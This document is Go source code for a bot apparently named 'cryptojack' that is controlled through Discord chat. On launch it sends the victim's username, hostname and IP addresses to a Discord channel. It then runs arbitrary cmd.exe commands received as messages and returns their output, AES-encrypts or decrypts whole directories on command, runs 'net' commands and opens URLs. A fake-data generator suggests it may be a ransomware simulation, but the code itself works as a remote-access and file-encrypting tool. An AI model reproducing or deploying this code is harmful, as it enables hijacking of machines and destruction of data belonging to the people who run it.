package main

import (
    "flag"
    "fmt"
    "math/rand"
    "os"
    "os/exec"
    "os/signal"
    "os/user"
    "path/filepath"
    "regexp"
    "strconv"
    "strings"
    "syscall"
    "time"

    "cryptojack/cjlib"
    "github.com/bwmarrin/discordgo"
)

// global variables
var (
    Token string
    BotID int
    msg   chan string
    kill  chan bool
)

func init() {
    flag.StringVar(&Token, "t", "", "Bot Token")
    flag.Parse()
    msg = make(chan string, 20)
    kill = make(chan bool)
}

func oscmd(cmd string) {
    args := []string{"/c"}
    args = append(args, strings.TrimSpace(cmd))
    cmdobj := exec.Command("cmd.exe", args...)
    output, err := cmdobj.CombinedOutput()
    if err == nil {
        msg <- string(output)
    } else {
        msg <- err.Error()
    }
}

func sysinfo() string {
    userobj, _ := user.Current()
    hostname, _ := os.Hostname()
    addrlist, _ := cjlib.AddressList()
    info := fmt.Sprintf("Username: **%s**\nHostname: **%s**\nAddresses: **", userobj.Username, hostname)
    for _, i := range addrlist {
        info += i + ", "
    }
    info = strings.TrimRight(info, ", ")
    return info + "**"
}

func main() {
    // make a random botid
    rand.Seed(time.Now().UTC().UnixNano())
    BotID = rand.Intn(1000)

    // Create a new Discord session using the provided bot token.
    dg, err := discordgo.New("Bot " + Token)
    if err != nil {
        fmt.Println("error creating Discord session,", err)
        return
    }

    // Register the messageCreate func as a callback for MessageCreate events.
    dg.AddHandler(messageCreate)

    // In this example, we only care about receiving message events.
    dg.Identify.Intents = discordgo.IntentsGuildMessages

    // Open a websocket connection to Discord and begin listening.
    err = dg.Open()
    if err != nil {
        fmt.Println("error opening connection,", err)
        return
    }

    // Wait here until CTRL-C or other term signal is received.
    fmt.Println("Bot is now running.  Press CTRL-C to exit.")

    // loop through and find general channel
    var generalID string = ""
    for _, guild := range dg.State.Guilds {
        channels, _ := dg.GuildChannels(guild.ID)
        for _, channel := range channels {
            if channel.Type != discordgo.ChannelTypeGuildText {
                continue
            }
            if channel.Name == "general" {
                generalID = channel.ID
            }
        }
    }

    // send out my banner
    banner := fmt.Sprintf("CJ_BotID: **#%03d**\n%s\n", BotID, sysinfo())
    dg.ChannelMessageSend(generalID, banner)

    // handle bot and kill signals
    done := false
    sc := make(chan os.Signal, 1)
    signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)
    for done == false {
        select {
        case result := <-msg:
            dg.ChannelMessageSend(generalID, result)
        case <-sc:
            done = true
        case <-kill:
            dg.ChannelMessageSend(generalID, fmt.Sprintf("%d: received kill and exiting", BotID))
            done = true
        default:
            time.Sleep(1 * time.Second)
        }
    }
    fmt.Println("Received kill signal. Exiting...")
    dg.Close()
}

func createFakeData(directory string) error {
    startdir, err := filepath.Abs(directory)
    if err != nil {
        return err
    }
    if _, err := os.Stat(startdir); err != nil {
        if err := os.Mkdir(startdir, 0755); err != nil {
            return err
        }
    } else {
        return err
    }
    go cjlib.FakeData(startdir, 2, msg)
    return nil
}

func encryptDirectory(directory string) {
    aeskey := cjlib.NewEncryptionKey()
    total, encrypted, skipped, err := cjlib.EncryptDirectoryStructure(
        directory, aeskey, "", ".cryptojack", false, false)
    if err == nil {
        msg <- fmt.Sprintf("Encrypt: %d total files, %d encrypted, %d skipped", total, encrypted, skipped)
    } else {
        msg <- err.Error()
    }
}

func displayWebPage(url string) {
    err := cjlib.DisplayWebPage(url)
    if err == nil {
        msg <- fmt.Sprintf("URL %s displayed", url)
    } else {
        msg <- err.Error()
    }
}


func decryptDirectory(directory string) {
    total, decrypted, skipped, err := cjlib.DecryptDirectoryStructure(
        directory, ".cryptojack", false, false)
    if err == nil {
        msg <- fmt.Sprintf("Decrypt: %d total files, %d decrypted, %d skipped", total, decrypted, skipped)
    } else {
        msg <- err.Error()
    }
}

// process messages in channels
func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
    if m.Author.ID == s.State.User.ID {
        return
    }
    if m.Content == "ping" {
        banner := fmt.Sprintf("CJ_BotID: **#%03d**\n%s\n", BotID, sysinfo())
        s.ChannelMessageSend(m.ChannelID, banner)
        return
    }
    sp := regexp.MustCompile(`\s+`)
    re := regexp.MustCompile(`(\d{1,3}):(.+?)$`)
    matches := re.FindStringSubmatch(m.Content)
    if len(matches) == 0 {
        return
    }
    id, _ := strconv.Atoi(matches[1])
    botcmd := strings.TrimSpace(matches[2])
    if BotID == id {
        if botcmd == "kill" {
            kill <- true
        } else if strings.HasPrefix(botcmd, "fakedata") {
            args := sp.Split(matches[2], 2)

            var dir string = ""
            if len(args) == 1 {
                dir = strings.Title(cjlib.RandomWord())
            } else {
                dir = strings.TrimSpace(args[1])
            }

            if err := createFakeData(dir); err == nil {
                s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("%d: Creating fake data in directory [%s]", BotID, dir))
            } else {
                s.ChannelMessageSend(m.ChannelID, err.Error())
            }
        } else if strings.HasPrefix(botcmd, "encrypt") {
            args := sp.Split(matches[2], 2)
            if len(args) == 2 {
                go encryptDirectory(args[1])
            } else {
                s.ChannelMessageSend(m.ChannelID, "Usage: #bot:encrypt <dirname>")
            }
        } else if strings.HasPrefix(botcmd, "decrypt") {
            args := sp.Split(matches[2], 2)
            if len(args) == 2 {
                go decryptDirectory(args[1])
            } else {
                s.ChannelMessageSend(m.ChannelID, "Usage: #bot:decrypt <dirname>")
            }
        } else if strings.HasPrefix(botcmd, "net") {
            args := sp.Split(matches[2], 2)
            if len(args) == 2 {
                go oscmd(fmt.Sprintf("net %s", args[1]))
            } else {
                s.ChannelMessageSend(m.ChannelID, "Usage: #bot:net <use|view>")
            }
        } else if strings.HasPrefix(botcmd, "webpage") {
            args := sp.Split(matches[2], 2)
            if len(args) == 2 {
                go displayWebPage(args[1])
            } else {
                s.ChannelMessageSend(m.ChannelID, "Usage: #bot:webpage <URL>")
            }
        } else {
              go oscmd(botcmd)
              s.ChannelMessageSend(m.ChannelID, "\n")
          }
    }
}
